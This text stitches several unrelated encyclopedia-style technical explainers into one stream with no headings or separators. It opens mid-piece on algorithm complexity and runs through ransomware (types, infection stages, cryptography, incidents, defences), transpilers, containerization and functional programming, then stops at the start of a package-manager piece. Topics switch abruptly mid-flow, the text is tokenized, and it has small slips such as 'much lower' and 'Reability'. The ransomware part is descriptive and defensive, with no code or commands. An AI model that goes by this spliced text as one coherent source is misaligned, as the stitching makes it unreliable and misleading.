In these cases , when arbitrary precision is used , operations such as division and modulo arithmetic are no longer trivial and their complexity must be accounted for .
From a theoretical perspective , this does n't matter to computer scientists , but it matters to programmers who have to work within machine limits .
Charles Babbage , while building his Analytical Engine , predicts the importance of studying the performance of algorithms .
Mathematician Paul Bachmann defines the Big - O notation .
It originally meant " order of " .
Decades later , Donald Knuth calls it the capital omicron .
The theory of computational complexity was born in the 1960s .
This is also the decade when problems that ca n't be solved in polynomial time ( NP problems ) are recognized .
Donald Knuth introduces new notations and clarifies the meaning of \(O\ ) , \(\Omega\ ) and \(\Theta\ ) .
R. Libeskin - Hadas introduces the term oblivious algorithm that 's applied to an algorithm whose complexity is independent of the input structure .
In other words , the best - case , worst - case and average complexity of the algorithm are all the same .
The damage done by ransomware .
Source : Zaharia 2017 .
Ransomware is a type of malicious software that first infects a computer system .
Once infected , users of the system can no longer access the system or parts of it .
This means that important data stored on the system will no longer be accessible .
If these systems are part of an organization , normal operations will be affected .
Those who control and distribute such ransomware often demand a payment ( aka ransom ) from the users .
Once payment is done , often via untraceable cryptocurrencies , affected users are allowed to regain access to their system .
Without a payment , it 's often difficult , if not impossible , to regain access .
Since 2013 , ransomware has become more sophisticated with the use of public key cryptography .
The best defence is to adopt best practices in computer and network security , as well as user awareness .
What are the types of ransomware ?
Crypto ransomware are taking over from locker ransomware .
Source : Savage et al .
2015 , fig .
4 .
There are basically two types of ransomware : Lockers : These deny access to the infected device and severely limit user interaction .
The screen may display information on how to make payments .
Mouse interaction may be disabled and only a few keys on the keyboard may be enabled to enter payment information .
System files and user data are usually untouched .
With lockers , tech savvy users with the right tools may be able to unlock the device and avoid ransom .
Lockers use social engineering to pressurize users into paying up .
Cryptos : These identify important files on the system and prevent user access to these files .
In most cases , they encrypt the files .
Cryptos work silently in the background until files have been encrypted and then they inform the user .
Users can still use the infected device , but without access to important data , and without proper backup , they usually have no choice but to pay up .
What are the steps by which a crypto ransomware infects a system ?
Steps by which crypto ransomware attack .
Source : Trend Micro 2016b .
Crypto ransomware usually works in stages : Arrival : Ransomware gets triggered when a user clicks a link in an email or website .
It downloads itself into the system and starts running in the background .
Contact : It contacts its command and control ( C&C ) server to exchange configuration information .
This may include cryptographic keys for later use .
Search : It searches the system for important files by their file types .
Encryption : It then generates encryption keys that might involve keys exchanged earlier with C&C. These keys are used to encrypt files identified by its search .
Telltale signs include slowdown of the system and flickering of the hard drive light .
Ransom : The user is displayed the ransom messages once all identified files have been encrypted .
What are the potential entry points for ransomware ?
Potential entry points into a system for a ransomware attack .
Source : Trend Micro 2016a .
Ransomware can arrive by email that can contain a link or an attachment .
If it 's a link , the user is lured to click it , download a file and execute it .
If it 's an attachment , the user is lured to open it .
Attachments could be Microsoft documents , XML documents , Zip files containing JavaScript files or a file with multiple extensions .
JS script upon execution will download the ransomware .
Microsoft documents may contain the ransomware embedded in them as a macro .
Ransomware could also arrive when a user visits a malicious or compromised website .
This is done using exploit kits .
Some of these include Angler , Neutrino and nuclear .
These kits probe the user 's device for vulnerabilities and exploit them immediately .
These can spread more easily since they can infect without users clicking or downloading anything .
A common way to lure unsuspecting users is via what 's called phishing .
An email or website attempts to pass itself off as a trusted service provider .
The text is worded in a manner that sounds convincing and legitimate .
This is called social engineering .
How is cryptography used by crypto ransomware ?
Crypto ransomware uses a combination of symmetric and asymmetric keys .
Source : Savage et al .
2015 , fig .
18 , 19 .
Cryto ransomware uses a combination of symmetric keys and asymmetric keys .
Typically , the symmetric key is used to encrypt the files while the asymmetric public key is used to encrypt the symmetric key .
Thus , to decrypt the files one requires a symmetric , which can be decrypted only when an asymmetric private key is available .
Asymmetric private key is kept secret at the C&C server .
For example , CryptoDefense uses a randomly generated AES key to encrypt files , but this key itself is encrypted using RSA .
The RSA public key itself is downloaded from the C&C server .
CTB - Locker does something similar , except that the RSA public key is embedded in the ransomware so that the attack can be completed even without an Internet connection .
In fact , CTB - Locker uses a combination of AES , SHA256 and ECDH ( curve25519 ) .
Cerber uses RC4 for encryption and involves an extra step of RSA key - pair generation .
Petya uses ECDH ( secp192k1 ) and SALSA20 algorithms .
What are some variations among ransomware out there ?
Ransomware comes in many variations .
They constantly evolve so that countermeasures are made ineffective .
Here are some variations : WannaCry was also a worm , able to spread itself to other devices on the network without user intervention .
WannaCry gave a deadline for payment and threatened that the ransom would go up if they did not comply .
In addition to denying users access , RAA ransomware and MIRCOP stole passwords and sent them to the C&C server .
Many used social engineering to confuse and intimidate users , saying that users had broken the law in some way .
If the ransom is unpaid , it would be reported to the police .
While most ransomware were executables ( .exe , .dll ) , others used a scripting language : JScript for Cryptowall 4.0 's downloader and RANSOM_JSRAA.A ; PowerShell script for PowerWare .
Jigsaw regularly deleted encrypted files until the ransom was paid .
CryptoLocker instead threatened to delete private encryption keys , which meant that data could never be recovered .
Petya , Satana , and GoldenEye modified the hard drive MBR ( Master Boot Record ) with a custom boot loader .
CTB - Locker used partners and revenue sharing to spread faster .
Could you name some ransomware attacks that caused significant damage ?
Ransomware variants from 2012 - 2016 .
Source : Zaharia 2017 .
Ransomware can affect any device , including laptops , servers and smartphones .
Ransomware can affect home users and lock them out of their personal data .
It can affect organizations such as hospitals , schools , government agencies , and more .
Attackers do n't care who 's the target , but they do set the ransom based on what they think the victims are likely to pay .
In February 2016 , Hollywood Presbyterian Medical Center was infected by Locky ransomware .
The ransom was 40 Bitcoins , about $ 17,000 .
San Francisco 's transit system , Muni , was attacked in November 2016 .
The ransom was $ 73,000 in Bitcoins .
In January 2017 , the Austrian hotel Romantik Seehotel Jaegerwirt was attacked .
Electronic room keys did not work and the reservation system was paralyzed .
The attackers demanded payment of $ 1,800 in Bitcoins .
In June 2017 , University College of London was attacked .
The city of Atlanta was crippled for five days by ransomware demanding $ 51,000 .
The Boeing plant in Charleston was hit by WannaCry in March 2018 .
Is the Internet - of - Things ( IoT ) vulnerable to ransomware ?
With IoT , the attack surface widens : thermostats , security cameras , smart locks , connected cars , power grids and other industrial systems can all get infected .
Unlike traditional ransomware that prevents users from accessing their data , IoT data is often on the cloud .
Instead , ransomware in IoT will be about paralyzing systems : traffic jams , power outages , malfunctioning equipment , etc .
In 2016 , the Mirai botnet infected more than 600,000 IoT devices and then used these devices to launch a distributed Denial of Service ( DDoS ) attack on web services .
Although Mirai was not a ransomware , it showed the potential for using IoT devices for large scale attacks .
Mirai was possible because IoT devices at the time were ( and perhaps even now are ) less secure than enterprise IT systems .
Mostly , routers and cameras were compromised .
Users often use default credentials , do n't upgrade or even login to these devices .
A variety of IoT devices exist and any ransomware must have variants or mutate on its own to infect this variety .
Since many IoT devices lack display , ransomware will also need to figure out emails and phone numbers to notify users about the ransom .
How can I protect myself from ransomware ?
Take regular backups of critical data .
Keep your security software and OS updated on a regular basis .
Be wary of unexpected mail with links or attachments .
Be wary of Microsoft Office attachments that ask you to enable macros .
If infected , disconnect the affected device from your network .
Scan all other devices on your network .
Identify the ransomware and try to recover it if possible .
If not , reformat the device and restore data from clean backups .
Report the incident to local authorities .
Joseph L. Popp distributes 20,000 floppy disks containing what could be the first known ransomware .
Called 1989 AIDS Trojan , it hides folders and encrypts file names .
Victims are asked to send $ 189 to a post office box in Panama .
Fake anti - virus programs have become increasingly common .
They inform users that they can " fix " problems in their systems for a fee .
Without doing any encryption , Trojan .
Winlock simply displays a fake Windows Product Activation notice .
Users are asked to call a premium international number to obtain an activation key .
Ransomware gets modern and sophisticated with the release of CryptoLocker .
It uses RSA public - key cryptography and keeps the private key safe at its command and control ( C&C ) server .
The attack lasted from September 2013 to May 2014 , in which period it collected $ 3 million from its victims .
An improved version called CryptoLocker 2.0 arrives in December .
It uses Tor and Bitcoin for anonymity and it 's not detected by anti - virus or firewalls .
Ransomware that encrypts files on an Android device arrives on the stage .
It 's called SimpleLocker .
It uses a trojan downloader .
Another one called LockerPin resets the PIN on the phone and demands a $ 500 ransom to unlock the device .
The number of variants of ransomware increased dramatically in 2016 .
From Q4 - 2015 to Q1 - 2016 , ransomware increased by 3,500 % and payments increased tenfold .
The US Justice Department states that in 2016 , ransomware attacks increased four times to 4,000 a day .
MAC OSX gets infected by KeRanger via Transmission BitTorrent client .
A WannaCry 2017 ransom note on an infected system .
Source : Wikipedia 2018a .
Ransomware WannaCry exploits a vulnerability in the SMB protocol , a vulnerability present in old unsupported versions of Windows .
The attack was contained within a few days , but not before it infected 200,000 computers across 150 countries .
Kaspersky Lab reports that 98 % of the successful attacks were on computers running Windows 7 .
Using the same SMB vulnerability that WannaCry exploited , once seeded , NotPetya spreads to computers on its own without needing spam emails or social engineering .
It encrypts the Master Boot Record ( MBR ) and a lot more .
It tricks users into paying a ransom , but in fact , the encryption process is irreversible .
SophosLabs publishes an article on Ransomware - as - a - Service ( RaaS ) .
These are available on the Dark Web , some even offering support .
These enable non - technical folks to launch their own ransomware variant .
Presumably , RaaS has been available on the Dark Web for a year or two .
Suppose you 've written a program in one language but wish to convert it to another language , then you would invoke what 's called a transpiler .
The programming language at the input to the transpiler may be called the source language , whereas the language at the output may be called the target language .
A transpiler is sometimes called a source - to - source compiler .
For example , converting C++ code to C code will involve a transpiler .
Converting Python code to Ruby code will involve a transpiler .
Let 's note that in these example both source and target languages are at the same level of abstraction .
But let 's say we convert Java code to bytecode , or C code to assembly code , then this is not called transpilation .
Transpilers do n't change the level of abstraction , such as translating from a high - level language to assembly code , bytecode or machine code .
How is a transpiler different from a compiler ?
Transpilation is not the same as compilation .
Source : Ackerman 2016 .
A compiler converts high - level human - readable code to low - level instructions that can run on a computer .
For example , a C compiler converts C code to machine executable code .
A Java compiler converts Java code to what 's called Java bytecode that 's interpreted at runtime to execute on the target machine .
A transpiler , on the other hand , usually works at the abstraction of high - level languages .
The output code is still human readable .
It can not be executed directly unless its own compiler or interpreter is invoked .
For example , a transpiler can convert Java code to C++ code .
Programmers will still need to invoke a C++ compiler before executing the resultant machine code .
However , some folks use these terms interchangeably .
For example , VOC is supposed to be transpiler from Python source code to Java bytecode when , in actual fact , these two are at different levels of abstraction .
However , it 's acceptable to call translations at the same level of abstraction as transpilation , such as from .ASM assembly code to .A86 assembly code .
ISO / IEC / IEEE 24765 defines five generations of languages that can be related to abstractions described above .
Why would I want to use a transpiler ?
Critical Python code was transpiled to Fortran for performance .
Source : Bysiek et al .
2016 , fig .
1 .
Here are a few reasons for using a transpiler : Migration : Migrate legacy code to a modern language .
Compatibility : Generate code conforming to an older version while developers benefit from features of a newer version , such as with browsers not updated to the latest JavaScript standards .
Coding Skills : Codebase can be transpiled to a language in which the skills are readily available .
Or it might be a matter of preference .
For example , those who are from an OOP background prefer TypeScript .
Python coders prefer CoffeeScript instead .
In both cases , code is transpiled to JavaScript .
Performance : Initial code was written for quick prototyping or the project is moving to a different platform where another language is more suitable .
Perhaps the target language has a better compiler that can generate more optimized code .
For example , critical parts of a Python codebase can be transpiled to Fortran and then called from Python .
Tooling : Source language has better IDEs , testing and debugging tools , such as with .NET and Visual Studio .
How does a transpiler work internally ?
Steps that a transpiler takes .
Source : Samuels 2017 .
A transpiler parses the code and extracts the tokens , which are the basic building blocks of the language .
Language keywords , variables , literals and operators are examples of tokens .
This step is a combination of lexical analysis and syntax analysis .
The transpiler knows how to do this because it understands the syntax rules of the input language .
Given this understanding , the transpiler builds what is called an Abstract Syntax Tree ( AST ) .
The next step is to transform the AST to suit the target language .
This is then used to generate code in the target language .
AST Explorer is an online tool to help you view the AST given a piece of code in many popular languages .
Could you name some transpilers out there ?
JavaScript is a language that 's been evolving at a regular pace , but there are also lots of browsers out on the web using older versions of the language .
Transpilers are therefore used commonly in the JS world to transpile code to ES5 , a version that 's supported by most browsers .
There are lots of transpilers for JS , but the popular ones are Babel , TypeScript and CoffeeScript .
ClojureScript transpiles from Clojure to JS .
JSweet transpiles from Java to TypeScript or JS .
GWT Web Toolkit , formerly known as Google Web Toolkit , enables Java programmers to use JS frontend for browser - based applications .
GWT includes a transpiler from Java to JS .
Script # transpiles from C # to JS .
C2Rust and Corrode are two alternatives for transpiling C to Rust .
VOC is a transpiler from Python to Java , which means that even Android apps can be built from a Python codebase .
Python itself has two incompatible versions : 2 and 3 .
However , tools are available to convert from one version to the other : ` 2to3 ` , ` modernize ` , ` futurize ` and ` pasteurize ` .
These could be termed as transpilers .
CONV86 input and output files .
Source : Intel 1979 , fig .
1 - 2 .
Intel publishes details of a converter called CONV86 .
It can convert from 8080/8085 assembly source code to 8086 assembly source code .
Since the latter is a typed language , the converter assigns types to each symbol .
Note that the term converter is used .
The term transpiler will possibly come later .
Tim Paterson writes TRANS.COM to translate Z80 assembly code into .ASM assembly code for the Intel 8086 processor .
The process is not fully automated and requires manual corrections .
Gary Kildall writes a program called XLT86 to transpile .ASM assembly code written for the Intel 8080 processor into .A86 assembly code for the Intel 8086 .
The idea is to automatically port P / M-80 and MP / M-80 programs to CP / M-86 and MP / M-86 platforms .
Bjarne Stroustrup , the creator of C++ , created Cfront to transpile C++ code to C code since C++ did n't have its own compiler at the time .
Development of Cfront was discontinued in 1993 .
Facebook created HipHop for PHP ( HPHPc ) for transpiling PHP to C++ for better runtime performance .
This was deprecated in 2013 by HipHop Virtual Machine ( HHVM ) that uses just - in - time compilation .
HPHPc did not fully support PHP , its performance flattened out and its deployment across all of Facebook 's servers was not trivial .
Sebastian McKenzie creates a transpiler named 6to5 , which translates ES6 code to ES5 code .
In February 2015 , it became Babel .
Containerization is a technique that allows software to run reliably regardless of the computing environment .
By encapsulating software within isolated environments called containers , we can more reliably port software across operating systems and hardware infrastructures .
Let 's say , most of the development or testing is done on a developer 's laptop .
The software may work as expected on the laptop , but when deployed on the server , the software fails .
This could be because the server is using different versions of libraries , has a different configuration or interfaces differently to other components of the system .
Containerization solves this problem by providing a consistent and isolated runtime environment regardless of the underlying OS or hardware infrastructure .
For developers , what this means is that we 're no longer deploying just the application software but deploying container images that contain the app along with its dependencies .
What 's a container and what 's in it ?
Understand containers by contrasting them against VMs .
Source : Janetakis 2017 .
Containers consist of the runtime environment : an application , dependencies , libraries , binaries , and configuration files needed to run an application , bundled into one package .
By containerizing the application platform and its dependencies , differences in OS distributions and underlying infrastructure are abstracted .
Essentially , a container includes the application and all of its dependencies .
It shares the OS kernel with other containers .
It 's not tied to a specific infrastructure : it only needs the Docker Engine ( or equivalent ) installed on the host .
Thus , containers isolate the application process in user space on the host OS from other application processes .
What are the benefits of containers ?
Results of a survey on the benefits of containerization .
Source : Coggin 2015 .
A survey commissioned by Red Hat in 2015 showed that containers are seen to bring better security , efficiency , portability , flexibility and speed .
More specifically , we can identify the following benefits : Benefits to Applications Portable Packaged in a standard way Automated testing , packaging and integrations Support newer microservices architectures Alleviate platform compatibility issues Benefits to Deployment Easy Repeatable Reliable deployments : improved speed and frequency of deployments Consistent application lifecycle : configure once and run multiple times Consistent environments : no more process differences between local , dev and staging environments Simple scaling : Fast deployments ease the addition of workers and permit workload to grow and shrink for on - demand use cases How is Virtualization different from Containerization ?
Comparing Virtual Machines and Containers .
Source : https://medium.com/@faizanbashir/docker-containers-101-e47f594a0ed With virtualization technology , the package that can be passed around is a Virtual Machine ( VM ) .
It includes an OS as well as the application .
A server running three VMs would have a hypervisor and three separate operating systems running on top of it .
By contrast , a server running three containerized applications runs on top of a single OS , all containers sharing the same OS kernel .
Shared parts of the operating system are read only , while each container has its own mount ( i.e. , a way to access the container ) and volumes for reading from and writing to the file system .
This means that the containers are much lower and use far fewer resources than virtual machines .
Containerization has been called an operating system level virtualization , an operating system feature in which the OS kernel allows the existence of multiple isolated user - space instances .
Instances are created from images that we can build and share .
Instances created from images are called containers , partitions , virtualization engines or jails ( FreeBSD ) .
Applications running inside a container can only see the container 's contents and devices assigned to the container .
What 's the typical size of a container ?
Containers can only be tens of megabytes in size .
For example , the Docker Alpine image is about 4 MB .
For comparison , Fedora version 25 is about 231 MB .
A virtual machine with its entire OS may be several gigabytes in size .
For this reason , a single server can host far more containers than virtual machines .
Virtual machines may take several minutes to boot up their operating systems and start running the applications they host .
However , containerized applications can be started almost instantly .
This also means that containers can be created as needed and destroyed quickly , thereby using resources efficiently .
What are some types of containers ?
The common use case is to separately run applications within Application Containers .
Code that developers create runs within these containers , which greatly simplifies the deployment of apps .
Docker and OCI - based containers are examples .
Another use case of containers is to provide a virtual operating system .
What if we wish to deploy Ubuntu , CentOS and RHEL on top of a common host OS ?
This is where Operating System Containers can be used .
LXC and LXD are examples .
It 's interesting that Docker and OCI - based containers can partly achieve this functionality by running ` systemd ` .
Suppose you 're building a specialized app .
You want the flexibility to customize your app but , at the same time , benefit from the automation and tooling of the container ecosystem .
You can use Pet Containers .
Administrators can benefit from Super Privileged Containers ( SPC ) for kernel module loading , monitoring , backups , etc .
SPCs usually have a tighter coupling with the host kernel .
Could you describe specific examples of container usage ?
OS containers vs. app containers .
Source : Karle 2015 .
Let 's take the example of a web application using Nginx as the load balancer , Node.js for the app and Postgres for database .
Traditionally , all of these would be deployed on a single machine .
These ca n't be deployed , scaled or managed independently .
Instead , if we adopt a three - tiered architecture , each one is delivered as a separate application container image .
Each one can be deployed independently , on different machines if needed .
Perhaps we want to run our app on a specific OS .
In this case , we can use an OS container image of that OS , install the necessary dependencies and bring up the app within the container in a consistent manner .
Application containers are used in smartphones .
Nexus One uses LXC on the Android kernel .
McAfee provides a Secure Container for Android .
Apple iPhones use containers to compartmentalize applications and their data .
Which are the technical enablers for implementing containers ?
The Linux container stack .
Source : https://www.engineyard.com/blog/isolation-linux-containers Linux Containers ( LXC ) is a modern method of virtualizing an application .
LXC leverages cgroups to isolate the CPU , memory , file / block I / O and network resources .
LXC also uses kernel namespaces to isolate the application from the operating system and separates the process trees , network access , user IDs , and file access .
LXC is considered a technique that falls between chroot and VM .
In version 1.0 of LXC , unprivileged containers are more secure because they run like regular unprivileged users .
To enable containers to start quickly , the container image is not copied but shared .
A copy is made only when data is modified .
This is called the Copy - on - Write ( CoW ) mechanism .
File - level CoW is easier to backup , more space - efficient and simpler to cache than block - level CoW on whole - system virtualizers .
What are some essential terms to know in relation to containers ?
A container is specified by one or more files called Container Image .
Often , a hierarchy of image layers , tagged and stored with metadata , together form what 's called a Repository .
Some use the two terms interchangeably .
A container image is stored on a Registry Server , whose location is known to anyone wishing to pull and use the image .
The system on which a container runs is called Container Host .
Running containers are also called Containerized Processes because , ultimately , they 're nothing but processes .
Thus , a container starts as an image at rest and ends up as a process during execution .
The job of processing user requests , pulling images from the registry and initiating execution of the container is done by the Container Engine .
The engine itself does n't execute containers .
This is done by the Container Runtime , which gets the image mount point and metadata from the engine , communicates with the kernel , and sets up relevant permissions .
Since a registry may have lots of repositories , namespaces help in logically separating them .
These can be names of people , organizations , products , etc .
These should not be confused with kernel namespaces .
Could you name some container implementations ?
Docker is the most popular one .
Others include Linux OpenVZ , Linux - VServer , FreeBSD Jails , AIX Workload Partitions ( WPARs ) , HP - UX Containers ( SRP ) , and Solaris Containers .
Docker offers a complete container ecosystem including image management , deployment assistance , automation , API for building Platform as a Service ( PaaS ) , and more .
The Open Container Initiative ( OCI ) has a standardized container runtime .
Its reference implementation is called runc .
This is used by Docker , CRI - O and others .
Docker previously used LXC as the runtime .
Then it created its own runtime called libcontainer , which eventually became runc .
Other OCI - compliant runtimes include crun , railcar , and katacontainers .
Among the different container engines are Docker , RKT , CRI - O , and LXD .
In addition , cloud providers may provide their own built - in container engines .
For interoperability , many engines accept Docker or OCI - compliant images .
Which Linux distributions are suitable for use as a container host ?
Most Linux distributions are unnecessarily feature - heavy if their intended use is simply to act as a container host to run containers .
For that reason , a number of Linux distributions have been designed specifically for running containers .
Here are some examples : Container Linux — formerly called CoreOS Linux , it 's one of the first lightweight - container operating systems built for containers .
RancherOS — a simplified Linux distribution built from containers , specifically for running containers .
Photon OS — a minimal Linux container host , optimized to run on VMware platforms .
Project Atomic Host — Red Hat 's lightweight container OS , has versions that are based on CentOS and Fedora , and there 's also a downstream enterprise version in Red Hat Enterprise Linux .
Ubuntu Core — the smallest Ubuntu version . Ubuntu Core is designed as a host operating system for IoT devices and large - scale cloud container deployments .
Alpine Linux — is a very tiny Linux distribution focused on security .
During the development of Unix V7 in 1979 , the chroot system call was introduced , changing the root directory of a process and its children to a new location in the filesystem .
In BSD Unix , this feature was introduced in 1982 .
FreeBSD Jails allow administrators to partition a FreeBSD computer system into several independent , smaller systems called jails , with the ability to assign an IP address for each system and configuration .
In 2001 , something similar was done by Linux VServer to partition resources ( file systems , network addresses , memory ) on a computer system .
Oracle released a Solaris Container called Solaris Zones that combines system resource controls and boundary separation provided by zones , which are able to leverage features like snapshots and cloning from ZFS .
OpenVZ is an operating system - level virtualization technology for Linux that uses a patched Linux kernel for virtualization , isolation , resource management and checkpointing .
Back then , the code was not released as part of the official Linux kernel .
Process Containers was launched by Google .
It 's designed for limiting , accounting and isolating resource usage ( CPU , memory , disk I / O , network ) of a collection of processes .
It was renamed Control Groups ( cgroups ) a year later and eventually merged into Linux kernel 2.6.24 .
LXC ( LinuX Containers ) is the first , most complete implementation of Linux container manager .
It 's implemented using cgroups and Linux namespaces .
It works on a single Linux kernel without requiring any patches .
Let Me Contain That For You ( LMCTFY ) is started as an open - source version of Google 's container stack , providing Linux application containers .
Applications can be made " container aware , " creating and managing their own subcontainers .
Active deployment in LMCTFY stopped in 2015 after Google started contributing core LMCTFY concepts to libcontainer , which is now part of the Open Container Foundation .
Docker is released and containers explode in popularity .
Docker uses LXC in its initial stages and later replaces that container manager with its own library , libcontainer .
Later , Docker separates itself from the pack by offering an entire ecosystem for container management .
Functional programming ( FP ) puts emphasis on functions , where functions are closer in spirit to mathematical functions than functions or subroutines in computer science .
A function is something that takes inputs and returns outputs without any side effects .
A set of inputs given to a function will always return the same set of outputs .
This implies that functions do not depend on global variables , shared resources , the thread context or the timing across threads .
The absence of side effects is essential for FP .
Functional programming has been around since the 1950s , but they got sidelined by imperative languages such as C , C++ and Java .
Today , in the context of parallel computing , synchronization across parallel threads can be difficult .
FP has come to the rescue .
FP enables clean abstractions , component design and interfaces , making the program more declarative and shorter .
What exactly do you mean by side effects ?
When a function relates to its external world in a hidden manner , then it has side effects .
For a function without side effects , its inputs are passed explicitly as function arguments .
Its output is via function return .
Such a function does not receive inputs via global variables such as message queues , shared buffers , databases or files .
Likewise , it does not modify external entities such as writing to a file or making an AJAX call in a web application .
The goal of FP is to reduce side effects , not completely eliminate them in the entire program .
Since programs have to interface with users , write to files or make network calls , they can not be without side effects .
We can , however , make most of the program functional by writing functions without side effects .
It 's important to track which parts of the system are impure .
Some languages have a type system to facilitate this .
Sometimes input and output are independently recognized as side causes and side effects respectively .
More commonly , it 's sufficient to use the term side effects to refer to both .
What conditions should a programming language satisfy to be considered functional ?
A pure FP language should prohibit side effects .
FP places importance on expressions rather than statements .
In this sense , FP is an instance of declarative programming , which implies that the focus is on what is to be computed rather than how to compute it .
Objects are immutable : once created , they can not be changed .
The focus is on data manipulated by functions rather than states stored within objects .
It has been said that " immutability and statelessness are core to functional programming .
" Program state is tracked as part of function arguments .
Thus , function recursion is preferred to looping based on loop variables .
Data flow is more important than control flow and this facilitates concurrency .
The order of function calls does n't matter if the data flow is preserved .
FP does not require dynamic typing or static typing for that matter .
The use of compile - time AST ( Abstract Syntax Tree ) macros does not imply FP .
How is FP different from imperative programming ?
Comparing looping and recursion .
Source : http://secretgeek.net/image/function_v_imperative.PNG With imperative programming , assignment of a variable is a common operation .
For example , ` x = x + 1 ` is a valid operation in C , C++ or Java .
But this makes no sense from a mathematical perspective ; that is , if we consider it as an equation , there 's no solution to it .
In FP , data is transformed but not mutated .
Expressions are important but storing the result is not .
Results are passed around to other functions .
Imperative programming is about objects and their status .
FP is about pure functions and higher - order functions .
Complex behaviour in FP can be constructed by composing simpler functions .
If OOP is about passing objects , FP is about passing functions .
With imperative programming , operations are specified step by step .
Loops with loop variables are used to iterate over lists .
With FP , the style is declarative .
Recursion and list processing using iterators are common control structures .
Michel Feathers tweeted in 2010 that , OO makes code understandable by encapsulating moving parts .
FP makes code understandable by minimizing moving parts .
Can you explain pure functions , first - class functions and higher - order functions ?
Pure functions conform to the rules of lambda calculus .
Programs written in pure FP will be referentially transparent and their correctness can be formally proven .
A practical way to define pure functions is that they have no side effects and always produce the same outputs for the same inputs .
This is also called determinism .
Impure FP therefore has elements of FP such as higher - order functions but may allow mutation of variables or even access to data outside the scope of functions .
Side effects could be a language feature or due to monads .
Closures can not be considered as pure functions .
First - class functions can be assigned to variables , passed as arguments to other functions and can be returned from other functions .
Functions in FP are first - class functions .
Higher - order functions are functions that accept a function as an argument and/or return a function as an output .
Thus , first - class functions are about the status that functions have in the language , whereas higher - order functions are explicitly those that accept / return functions as input / output respectively .
They eliminate loops .
Code can be refactored to avoid repetitive code .
Closures are examples of higher - order functions .
Can you point out some concepts / features of FP ?
Some characteristics of FP .
Source : Grimm 2017 .
We may note the following : Closure : This is a data structure with a code pointer and an environment of bound variables , implemented as anonymous functions .
Alternatively , " a closure is a function 's scope that 's kept alive by a reference to that function .
" Referential transparency : This is a property of pure functions that always return the same outputs for the same inputs .
Another way of stating this is that an object can be replaced by its value since objects are immutable .
Equational reasoning can be applied to code for either provability or optimization .
Currying : A function with multiple arguments is transformed into a chain of functions , each taking a single argument .
Currying is useful to adapt a function to a form that some other function or interface expects .
Currying is sometimes confused for partial functions .
Composability : When functions perform specific tasks , we can use them as building blocks to compose more complex functionality .
While composability is a concept , currying and pipelining may be considered as an implementations for it .
What techniques do FP languages use ?
We may note the following : Tail call optimization : With recursion , FP usually supports tail call optimization that reuses the same stack frame for a sequence of recursive calls .
Without this , a program could run out of stack memory when recursion descends many levels deep .
Pattern matching : A concise way to match a value or type and thereby avoid complex control structures .
Lazy evaluation : Code will be executed only when required .
Haskell does this well .
Graph reduction is a technique to implement lazy evaluation .
Partial functions : They wrap up a function by fixing some arguments to values and retaining the rest as arguments .
In fact , partial functions simplify implementation of closures .
Pipelining : Pass the output of one function as input to another .
Many function calls can be chained in a sequence in this way .
Pipelining makes possible code reuse , unit testing and parallel execution .
Continuation : This enforces execution in a specified order , which is particularly useful when lazy evaluation would skip execution .
Why or when should we use FP ?
With multicore , multi - processor or networked systems , concurrency is becoming a challenge .
With no side effects , FP is an approach that eliminates shared variables , critical sections and deadlocks .
Erlang implements the Actor concurrency model , meaning that messages are passed between threads rather than sharing variables .
Since there are no side effects ( or side causes ) , FP is easier to test and debug .
Unit tests need to worry about only function arguments .
Peeking into the stack is enough to debug issues .
Hot code deployment is possible with FP since object instances holding states do n't really exist in FP .
Reability of code generally improves with FP .
Code is concise since the focus is on what rather than how .
For mission - critical systems , program correctness can be proven formally .
Likewise , compilers can transform code into more optimized forms .
These are possible due to the mathematical basis on which FP was founded .
Due to lazy evaluation , it 's possible to optimize code , abstract control structures and implement infinite data structures .
Where is FP used in the real world ?
Ericsson uses Erlang in telecommunication switches .
AT&T uses Haskell for network security .
Akamai content delivery network uses Clojure while Twitter uses Scala .
Elm is a pure FP language that compiles to JavaScript .
It is used by NoRedInk .
Computer aided design ( CAD ) software often supports AutoLISP .
OCaml has been used for financial analysis and research .
Scala is widely used for data science .
Clojure is being used in a wide range of applications , from finance to retail .
Hughes shows examples of using FP for numerical problems as well as gaming .
Many uses of Haskell in the industry are well documented .
An annual conference named Commercial Uses of Functional Programming ( CUFP ) has been going on as early as 2004 to track and share use cases and best practices .
As an example , the use of Caml in industry was presented in 2007 .
Which programming languages are considered as functional ?
Some examples of FP languages .
Source : Kestelyn 2015 .
While LISP is one of the earliest FP languages , the following ( non - exhaustive list ) are among those being used commercially : Haskell , F # , Clojure , Scala , OCaml , SML , Erlang .
Wikipedia gives lists of FP languages that are considered pure and impure .
Excel may be considered as a FP language .
It 's likely that object - oriented programming ( OOP ) will coexist with FP .
For complex applications requiring concurrency , FP may be preferred .
F # and Scala combine elements of FP and OOP .
Some have even used the term " object - functional programming " to mark this trend .
Many popular languages , while not designed as FP , can be used in part as FP .
Examples include Java , Python , and R. Sometimes third - party libraries or packages enable FP , such as Swiftz for Swift , Underscore.js for JavaScript and Fn.py for Python .
Immutable.js in JavaScript enables data immutability .
Why did FP take so long to get popular ?
FP started with ideas rooted in mathematics , logic and formalism .
This appealed to academics who approached it theoretically .
It did n't appeal to the programming community who considered functions more as code blocks for partitioning behaviour and reusing code .
To them , imperative programming ( including OOP ) was more practical .
It was also believed that FP , with all its limitations , could not be used to build big complex programs .
FP was also believed to be slower .
Some have argued that FP involves abstraction .
This can be difficult for programmers used to coding with loops and assignments .
How is FP different from the lambda calculus ?
FP may be regarded as a practical implementation of lambda calculus .
Lambda calculus was a tool to study the problem of computability .
It is independent of physical constraints .
FP is application of some ideas of lambda calculus .
Alonzo Church invented lambda calculus at Princeton University while formally investigating ways to program machines .
This is part of a bigger effort at Princeton where others , including Alan Turing , John von Neumann and Kurt Gödel , attempt to formalise mathematics and computing .
IPL was created at the Carnegie Institute of Technology and could be considered as the first FP language ( in assembly ) , though it has some imperative language features .
MIT professor John McCarthy invents List Processing Language ( LISP ) as the first implementation of Church 's lambda calculus .
Common Lisp and Scheme are two popular dialects of LISP .
The influence of lambda calculus on Lisp has been challenged .
Programmers at MIT 's Artificial Intelligence Lab build a Lisp machine .
Thus , Lisp got its own native hardware rather than running on von Neumann architecture .
Robin Milner at the University of Edinburgh creates ML ( Meta Language ) .
OCaml and Standard ML ( SML ) are popular dialects of ML .
John Backus publishes a paper describing the proper use of functions and expressions without assignments and storage .
Some call this function - level programming , but the paper influences FP .
Typical flow or architecture of Linux package management .
Source : openSUSE Wiki 2016 .
Package Managers are used to automating the process of installing , upgrading , configuring , and removing programs .
There are many package managers today for Unix / Linux - based systems .
By mid-2010s , package managers made their way to Windows as well .
Package managers are also used for installing and managing modules for languages such as Python , Ruby , etc .
